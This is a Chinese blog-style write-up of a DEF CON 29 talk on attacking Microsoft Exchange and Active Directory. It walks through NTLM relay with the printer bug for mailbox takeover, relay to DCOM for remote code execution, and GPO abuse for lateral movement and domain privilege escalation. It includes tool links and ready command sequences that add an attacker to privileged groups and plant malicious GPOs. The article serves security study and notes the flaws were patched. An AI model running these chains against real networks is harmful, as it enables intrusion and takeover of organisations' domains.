##  议题解读：One Domain Account For More Than Exchange Server RCE

鸿鹄实验室a  [ 鸿鹄实验室 ](javascript:void\(0\);)

**鸿鹄实验室** ![]()

微信号 gh_a2210090ba3f

功能介绍 鸿鹄实验室，欢迎关注

____

__

收录于话题

  

      本文是对defcon会议 One Domain Account For More Than Exchange Server RCE的简单解读(复制粘贴)，pdf地址：

  

https://media.defcon.org/DEF%20CON%2029/DEF%20CON%2029%20presentations/Tianze%20Ding%20-%20Vulnerability%20Exchange%20-%20One%20Domain%20Account%20For%20More%20Than%20Exchange%20Server%20RCE.pdf

  

视频地址：https://www.youtube.com/watch?v=7h38rI8KT30

  

推荐一波该议题，给类组合拳。  

  

![](https://gitee.com/fuli009/images/raw/master/public/20210815133402.png)

  

议题速览

  

1、exchange攻击面总览

2、从域认证到Mailbox接管

3、从域认证到exchange rce

4、横向移动、域提权

  

议题部分

  

exchange的研究意义这里就不多说了，用户多、权限高，全球设备多

  

![](https://gitee.com/fuli009/images/raw/master/public/20210815133403.png)

  

而且再域内拥有较高权限，有着拿下exchange就拿下域的说法，且在安装exchange默认的组具有writeacl权限，可进行各类组合攻击，但这类权限已被在2019年修复。

  

![](https://gitee.com/fuli009/images/raw/master/public/20210815133404.png)

  

exchange的架构如下

  

![](https://gitee.com/fuli009/images/raw/master/public/20210815133405.png)

  

已被攻陷的部分如下

  

![](https://gitee.com/fuli009/images/raw/master/public/20210815133406.png)

  

从域认证到Mailbox接管

  

在exchange中，提供了各类导入、导出等指定路径的功能，而该路径为UNC路径，

  

![](https://gitee.com/fuli009/images/raw/master/public/20210815133407.png)

  

而有过相关基础的就知道，UNC路径可获取到目标的认证消息，默认为机器账户的凭据

  

![](https://gitee.com/fuli009/images/raw/master/public/20210815133408.png)

  

而这里便要提到ntlm relay攻击了，议题也对该攻击进行了简单介绍

  

![](https://gitee.com/fuli009/images/raw/master/public/20210815133410.png)

  

![]()

![](https://gitee.com/fuli009/images/raw/master/public/20210815133411.png)

![](https://gitee.com/fuli009/images/raw/master/public/20210815133412.png)

  

那我们还需要知道那个exchange接口支持ntlm才能进行此类攻

  

![](https://gitee.com/fuli009/images/raw/master/public/20210815133413.png)

  

以及一个EPA的概念

  

![](https://gitee.com/fuli009/images/raw/master/public/20210815133414.png)

  

但exchange默认EPA是不会开启的。下面就是找一个relay的接口，就可以进行我们的攻击了，这里选择的EWS，EWS具有下面功能

  

![](https://gitee.com/fuli009/images/raw/master/public/20210815133415.png)

然后配合打印机漏洞便可进行攻击，攻击链如下：

  

![](https://gitee.com/fuli009/images/raw/master/public/20210815133416.png)

  

需要的工具：

  

https://github.com/quickbreach/ExchangeRelayX

https://github.com/dirkjanm/krbrelayx/

https://github.com/SecureAuthCorp/impacket/blob/master/examples/exchanger.py

  

命令：

  

  *   *   * 

    
    
    exchangeRelayx.py -t exchange2 address -l 0.0.0.0printerbug.py domain/user:password@exchange1 attackaddressexchanger.py domain/user:password@exchange1 nspi dump-tables -name GAL

  

![](https://gitee.com/fuli009/images/raw/master/public/20210815133417.png)

  

此类攻击在2021被修复。

  

从域认证到exchange rce

  

首先，exchange的机器账户默认属于本地管理员组

  

![](https://gitee.com/fuli009/images/raw/master/public/20210815133418.png)

  

然后作者说了几种relay场景以及为什么不能进行relay

  

![](https://gitee.com/fuli009/images/raw/master/public/20210815133419.png)

  

然后作者发现可以使用DCOM得MSRPC进行攻击

  

![](https://gitee.com/fuli009/images/raw/master/public/20210815133420.png)

选中的DCOM对象为

  

  * 

    
    
    MMC20.Application (49B2791A-B1AE-4C90-9B8E-E860BA07F89)

  

攻击链如下

  

![](https://gitee.com/fuli009/images/raw/master/public/20210815133421.png)

  

工具：

  

https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py

  

命令：

  

  *   * 

    
    
    ntlmrelayx.py -t dcom://exchange2 -smb2supportprinterbug.py domain/user:password@exchange1 attackaddress

  

横向移动、域提权

  

横向移动

  

作者给的图以及很明了了，有一个Exchange Trusted Subsystem组成员权限的前提下，便可以利用GPO实现对指定用户(域管除外)的rce。

  

![](https://gitee.com/fuli009/images/raw/master/public/20210815133422.png)

工具：

  

https://github.com/Dliv3/SharpGPO

https://github.com/FSecureLABS/SharpGPOAbuse

  

命令：

  

  *   *   *   *   *   *   * 

    
    
    net group "Exchange Trusted Subsystem" attacker /add /domain //将指定用户加的高权限组net group "Group Policy Creator Owners" attacker /add /domain  //将指定用户加的高权限组SharpGPO.exe --Action NewOU --OUName "EvilOU" //新建OUSharpGPO.exe --Action NewGPO --GPOName "EvilGPO" //新建GPOSharpGPO.exe --Action NewGPLink --DN "OU=EvilOU,DC=xx,DC=xx" --GPOName "EvilGPO" //OU与GPO进行链接SharpGPOAbuse.exe --AddUserTask --TaskName "PocCalc" --Author attch --Command "cmd.exe" --Argument "/c calc.exe" --GPOName //给GPO添加任务SharpGPO.exe --Action MoveObject --SrcDC "CN=XXX,CN=users,DC=xx,DC=xx" --DstDN "OU=EvilOU,DC=xx,DC=xx" //将指定用户移动到新建的OU中

  

域提权

  

原理跟上面类似，只是把用户改成了机器

  

![](https://gitee.com/fuli009/images/raw/master/public/20210815133423.png)

  

工具：

  

https://github.com/Dliv3/SharpGPO

https://github.com/FSecureLABS/SharpGPOAbuse

  

命令：

  

  *   *   *   *   *   *   * 

    
    
    net group "Exchange Trusted Subsystem" attacker /add /domain //将指定用户加的高权限组net group "Group Policy Creator Owners" attacker /add /domain  //将指定用户加的高权限组SharpGPO.exe --Action NewOU --OUName "EvilOU" //新建OUSharpGPO.exe --Action NewGPO --GPOName "EvilGPO" //新建GPOSharpGPO.exe --Action NewGPLink --DN "OU=EvilOU,DC=xx,DC=xx" --GPOName "EvilGPO" //OU与GPO进行链接SharpGPOAbuse.exe --AddUserTask --TaskName "PocCalc" --Author attch --Command "cmd.exe" --Argument "/c calc.exe" --GPONameSharpGPO.exe --Action MoveObject --SrcDC "CN=XXX,OU=Domain Controllers,DC=xx,DC=xx" --DstDN "OU=EvilOU,DC=xx,DC=xx" //将指定机器移动到新建的OU中

  

最后移除新建的OU、GPO

  

  *   * 

    
    
    SharpGPO.exe --Action RemoveOU --OUName "EvilOU" //移除OUSharpGPO.exe --Action RemoveGPO --GPOName "EvilGPO" //移除GPO

  

  

  
  
  
  
  
     ▼更多精彩推荐，请关注我们▼

  

 **请严格遵守网络安全法相关条例！此分享主要用于学习，切勿走上违法犯罪的不归路，一切后果自付！**

  

![](https://gitee.com/fuli009/images/raw/master/public/20210815133424.png)

  

  

预览时标签不可点

收录于话题 #

个 __

上一篇 下一篇

阅读

分享 收藏

赞 在看

____已同步到看一看[写下你的想法](javascript:;)

前往“发现”-“看一看”浏览“朋友在看”

![](//res.wx.qq.com/mmbizwap/zh_CN/htmledition/images/pic/appmsg/pic_like_comment55871f.png)

前往看一看

**看一看入口已关闭**

在“设置”-“通用”-“发现页管理”打开“看一看”入口

[我知道了](javascript:;)

__

已发送

取消 __

####  发送到看一看

发送

议题解读：One Domain Account For More Than Exchange Server RCE

最多200字，当前共字

__

发送中

微信扫一扫  
关注该公众号

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

[知道了](javascript:;)

**长按识别前往小程序**

![]()

